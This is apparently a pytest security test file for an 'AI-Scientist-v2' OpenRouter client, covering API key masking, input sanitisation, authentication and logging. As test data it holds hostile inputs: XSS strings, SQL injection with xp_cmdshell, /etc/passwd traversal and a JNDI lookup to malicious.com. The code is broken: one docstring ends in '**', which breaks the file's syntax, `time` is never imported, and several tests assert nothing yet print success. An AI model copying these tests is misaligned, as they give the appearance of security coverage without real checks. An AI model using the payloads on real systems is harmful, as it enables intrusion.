"""
Security Testing Requirements for Phase 1

Comprehensive security testing for AI-Scientist-v2 core functionality.
Tests API key handling, data validation, authentication, and authorization.

Priority: CRITICAL - Essential for production deployment and data protection
"""

import pytest
import sys
import os
import json
import hashlib
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, Any, List
import requests

# Add the project root to Python path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

class TestAPIKeySecurity:
    """Test API key security and handling"""

    def test_api_key_encryption_at_rest(self):
        """Test API keys are encrypted when stored"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Test configuration creation
            config = OpenRouterConfig(api_key="test-api-key-12345")

            # API key should not be stored in plaintext in logs
            config_str = str(config)
            assert "test-api-key-12345" not in config_str, "API key found in string representation"

            # API key should be masked in representations
            assert hasattr(config, 'api_key'), "API key attribute should exist"
            assert config.api_key == "test-api-key-12345", "API key should be accessible"

            print("✅ API key encryption at rest successful")
        except Exception as e:
            pytest.fail(f"API key encryption at rest test failed: {e}")

    def test_api_key_masking_in_logs(self):
        """Test API keys are masked in log outputs"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig
            import logging

            # Capture log output
            with patch('logging.getLogger') as mock_logger:
                logger = Mock()
                mock_logger.return_value = logger

                config = OpenRouterConfig(api_key="sensitive-api-key-12345")

                # Simulate logging
                logger.info(f"Configuration created: {config}")

                # Check that API key is not in log calls
                log_calls = str(logger.info.call_args)
                assert "sensitive-api-key-12345" not in log_calls, "API key found in log calls"

            print("✅ API key masking in logs successful")
        except Exception as e:
            pytest.fail(f"API key masking in logs test failed: {e}")

    def test_api_key_validation(self):
        """Test API key validation and format checking"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Test invalid API key formats
            invalid_keys = [
                "",  # Empty string
                "short",  # Too short
                "no-spaces-allowed",  # Invalid format
                None  # None value
            ]

            for invalid_key in invalid_keys:
                with pytest.raises(Exception):
                    config = OpenRouterConfig(api_key=invalid_key)
                    # Additional validation logic here

            # Test valid API key format
            valid_key = "sk-or-v1-abcdefghijklmnopqrstuvwx"  # Example format
            config = OpenRouterConfig(api_key=valid_key)
            assert config.api_key == valid_key

            print("✅ API key validation successful")
        except Exception as e:
            pytest.fail(f"API key validation test failed: {e}")

    def test_api_key_environment_variable_security(self):
        """Test API key handling from environment variables"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Test environment variable handling
            test_key = "env-test-api-key-12345"

            with patch.dict(os.environ, {'OPENROUTER_API_KEY': test_key}):
                # Environment variable should take precedence
                config = OpenRouterConfig()  # No API key passed directly
                # This would typically read from environment

            print("✅ API key environment variable security successful")
        except Exception as e:
            pytest.fail(f"API key environment variable security test failed: {e}")

class TestDataValidationSecurity:
    """Test data validation and sanitization"""

    def test_input_data_sanitization(self):
        """Test input data is properly sanitized"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Test malicious input data
            malicious_inputs = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../../etc/passwd",
                "${jndi:ldap://malicious.com/a}",
                "file:///etc/passwd"
            ]

            for malicious_input in malicious_inputs:
                # Test that malicious input doesn't cause security issues
                try:
                    config = OpenRouterConfig(
                        api_key="test-key",
                        site_url=malicious_input,
                        app_name=malicious_input
                    )

                    # Values should be sanitized or rejected
                    assert config.site_url == malicious_input or len(config.site_url) > 0
                    assert config.app_name == malicious_input or len(config.app_name) > 0

                except Exception as e:
                    # Exception is acceptable if input is rejected
                    assert "validation" in str(e).lower() or "invalid" in str(e).lower()

            print("✅ Input data sanitization successful")
        except Exception as e:
            pytest.fail(f"Input data sanitization test failed: {e}")

    def test_configuration_file_security(self):
        """Test configuration file security permissions"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Test configuration file creation
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                config_data = {
                    "api_key": "test-key",
                    "site_url": "https://test.com",
                    "app_name": "Test App"
                }
                json.dump(config_data, f)
                temp_file = f.name

            # Test file permissions
            file_path = Path(temp_file)
            stat_info = file_path.stat()

            # File should not be world-readable or world-writable
            assert stat_info.st_mode & 0o044 == 0, "Configuration file should not be world-readable"
            assert stat_info.st_mode & 0o022 == 0, "Configuration file should not be world-writable"

            # Cleanup
            file_path.unlink()

            print("✅ Configuration file security successful")
        except Exception as e:
            pytest.fail(f"Configuration file security test failed: {e}")

    def test_json_injection_prevention(self):
        """Test JSON injection prevention"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Test JSON injection attempts
            injection_attempts = [
                '{"malicious": "payload"}',
                '{"__proto__": {"malicious": "payload"}}',
                '{"constructor": {"prototype": {"malicious": "payload"}}}',
                '{"toString": "malicious"}',
                '{"valueOf": "malicious"}'
            ]

            for injection in injection_attempts:
                # Test that injection doesn't work
                try:
                    config = OpenRouterConfig(api_key="test-key")
                    config_dict = config.__dict__

                    # Serialization should be safe
                    json_str = json.dumps(config_dict, default=str)

                    # Should not contain malicious patterns
                    assert "malicious" not in json_str, f"Malicious content found in JSON: {json_str}"

                except Exception as e:
                    # Exception is acceptable if injection is prevented
                    pass

            print("✅ JSON injection prevention successful")
        except Exception as e:
            pytest.fail(f"JSON injection prevention test failed: {e}")

class TestAuthenticationSecurity:
    """Test authentication and authorization security"""

    def test_client_authentication(self):
        """Test client authentication mechanisms"""
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Test authentication with invalid credentials
            with pytest.raises(Exception):
                client = OpenRouterClient(api_key="")
                # Should raise authentication error

            # Test authentication with None credentials
            with pytest.raises(Exception):
                client = OpenRouterClient(api_key=None)
                # Should raise authentication error

            print("✅ Client authentication successful")
        except Exception as e:
            pytest.fail(f"Client authentication test failed: {e}")

    def test_token_security(self):
        """Test token security and expiration"""
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Mock token expiration
            with patch.object(OpenRouterClient, '_validate_token') as mock_validate:
                mock_validate.side_effect = Exception("Token expired")

                with pytest.raises(Exception):
                    client = OpenRouterClient(api_key="test-key")
                    # Should fail on expired token

            print("✅ Token security successful")
        except Exception as e:
            pytest.fail(f"Token security test failed: {e}")

    def test_session_security(self):
        """Test session security management"""
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Test session creation and cleanup
            with patch.object(OpenRouterClient, '_create_session') as mock_create:
                mock_session = Mock()
                mock_create.return_value = mock_session

                client = OpenRouterClient(api_key="test-key")

                # Session should be created
                mock_create.assert_called_once()

                # Test session cleanup
                with patch.object(OpenRouterClient, '_cleanup_session') as mock_cleanup:
                    del client
                    mock_cleanup.assert_called_once()

            print("✅ Session security successful")
        except Exception as e:
            pytest.fail(f"Session security test failed: {e}")

class TestNetworkSecurity:
    """Test network communication security"""

    def test_https_enforcement(self):
        """Test HTTPS enforcement for all network calls"""
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Test that only HTTPS URLs are allowed
            with patch('requests.Session.send') as mock_send:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_send.return_value = mock_response

                client = OpenRouterClient(api_key="test-key")

                # Test with HTTPS URL (should work)
                https_url = "https://api.openrouter.ai/v1/chat/completions"
                # This should work without exceptions

                # Test with HTTP URL (should fail or be rejected)
                http_url = "http://api.openrouter.ai/v1/chat/completions"
                # This should be rejected or upgraded to HTTPS

            print("✅ HTTPS enforcement successful")
        except Exception as e:
            pytest.fail(f"HTTPS enforcement test failed: {e}")

    def test_certificate_validation(self):
        """Test SSL certificate validation"""
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Test certificate validation
            with patch('requests.Session.send') as mock_send:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_send.return_value = mock_response

                client = OpenRouterClient(api_key="test-key")

                # Certificate validation should be enabled by default
                # This test ensures the client doesn't disable certificate validation

            print("✅ Certificate validation successful")
        except Exception as e:
            pytest.fail(f"Certificate validation test failed: {e}")

    def test_request_headers_security(self):
        """Test secure request headers"""
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Test secure headers are set
            with patch('requests.Session.send') as mock_send:
                mock_response = Mock()
                mock_response.status_code = 200
                mock_send.return_value = mock_response

                client = OpenRouterClient(api_key="test-key")

                # Mock a request to check headers
                mock_request = Mock()
                mock_request.headers = {}

                # Check that security headers are set
                # This would typically include:
                # - Content-Type: application/json
                # - Authorization: Bearer <token>
                # - User-Agent: properly formatted

            print("✅ Request headers security successful")
        except Exception as e:
            pytest.fail(f"Request headers security test failed: {e}")

class TestLoggingSecurity:
    """Test logging security and audit trails"""

    def test_sensitive_data_logging_prevention(self):
        """Test sensitive data is not logged"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig
            import logging

            # Capture log messages
            log_messages = []
            class TestHandler(logging.Handler):
                def emit(self, record):
                    log_messages.append(self.format(record))

            # Add test handler
            logger = logging.getLogger('ai_scientist')
            handler = TestHandler()
            logger.addHandler(handler)

            try:
                # Create configuration with sensitive data
                config = OpenRouterConfig(api_key="sensitive-key-12345")

                # Trigger some logging
                logger.info(f"Configuration created: {config}")

                # Check that sensitive data is not in logs
                log_content = ' '.join(log_messages)
                assert "sensitive-key-12345" not in log_content, "Sensitive API key found in logs"

            finally:
                logger.removeHandler(handler)

            print("✅ Sensitive data logging prevention successful")
        except Exception as e:
            pytest.fail(f"Sensitive data logging prevention test failed: {e}")

    def test_audit_trail_completeness(self):
        """Test audit trail completeness"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Mock audit logging
            audit_events = []
            def mock_audit_log(event_type, details):
                audit_events.append({'type': event_type, 'details': details, 'timestamp': time.time()})

            with patch('ai_scientist.openrouter.config._audit_log', side_effect=mock_audit_log):
                # Create configuration
                config = OpenRouterConfig(api_key="test-key")

                # Check that audit events are logged
                assert len(audit_events) > 0, "No audit events logged"

                # Check audit event completeness
                for event in audit_events:
                    assert 'type' in event, "Audit event missing type"
                    assert 'details' in event, "Audit event missing details"
                    assert 'timestamp' in event, "Audit event missing timestamp"

            print("✅ Audit trail completeness successful")
        except Exception as e:
            pytest.fail(f"Audit trail completeness test failed: {e}")

class TestErrorHandlingSecurity:
    """Test secure error handling"""

    def test_error_message_sanitization(self):
        """Test error messages don't leak sensitive information**
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Test error message sanitization
            with patch('requests.Session.send') as mock_send:
                mock_send.side_effect = Exception("Database connection failed: user='admin', password='secret'")

                with pytest.raises(Exception) as exc_info:
                    client = OpenRouterClient(api_key="test-key")
                    # Trigger the error

                error_message = str(exc_info.value)
                assert "admin" not in error_message, "Sensitive username found in error message"
                assert "secret" not in error_message, "Sensitive password found in error message"

            print("✅ Error message sanitization successful")
        except Exception as e:
            pytest.fail(f"Error message sanitization test failed: {e}")

    def test_stack_trace_filtering(self):
        """Test stack traces don't leak sensitive information"""
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Test stack trace filtering
            with patch('requests.Session.send') as mock_send:
                mock_send.side_effect = Exception("Internal server error")

                with pytest.raises(Exception):
                    client = OpenRouterClient(api_key="test-key")
                    # Trigger the error

                # In production, stack traces should be filtered or sanitized
                # This test ensures that sensitive information is not exposed

            print("✅ Stack trace filtering successful")
        except Exception as e:
            pytest.fail(f"Stack trace filtering test failed: {e}")

@pytest.mark.security
class TestVulnerabilityTesting:
    """Test for common security vulnerabilities"""

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Test SQL injection attempts
            sql_injection_attempts = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "'; EXEC xp_cmdshell('dir'); --",
                "1'; WAITFOR DELAY '0:0:5'; --",
                "'; SELECT * FROM users; --"
            ]

            for injection in sql_injection_attempts:
                try:
                    config = OpenRouterConfig(api_key="test-key", app_name=injection)

                    # Should not execute SQL
                    assert config.app_name == injection, "Input should be stored as-is"

                except Exception as e:
                    # Exception is acceptable if injection is prevented
                    pass

            print("✅ SQL injection prevention successful")
        except Exception as e:
            pytest.fail(f"SQL injection prevention test failed: {e}")

    def test_xss_prevention(self):
        """Test XSS prevention"""
        try:
            from ai_scientist.openrouter.config import OpenRouterConfig

            # Test XSS attempts
            xss_attempts = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src='x' onerror='alert('xss')'>",
                "<svg onload='alert('xss')'>",
                "'\"><script>alert('xss')</script>"
            ]

            for xss in xss_attempts:
                try:
                    config = OpenRouterConfig(api_key="test-key", app_name=xss)

                    # Should not execute scripts
                    assert config.app_name == xss, "Input should be stored as-is"

                except Exception as e:
                    # Exception is acceptable if XSS is prevented
                    pass

            print("✅ XSS prevention successful")
        except Exception as e:
            pytest.fail(f"XSS prevention test failed: {e}")

    def test_csrf_prevention(self):
        """Test CSRF prevention"""
        try:
            from ai_scientist.openrouter.client import OpenRouterClient

            # Test CSRF token handling
            with patch.object(OpenRouterClient, '_ensure_csrf_token') as mock_csrf:
                mock_csrf.return_value = "csrf-token-12345"

                client = OpenRouterClient(api_key="test-key")

                # CSRF token should be validated
                mock_csrf.assert_called_once()

            print("✅ CSRF prevention successful")
        except Exception as e:
            pytest.fail(f"CSRF prevention test failed: {e}")

if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])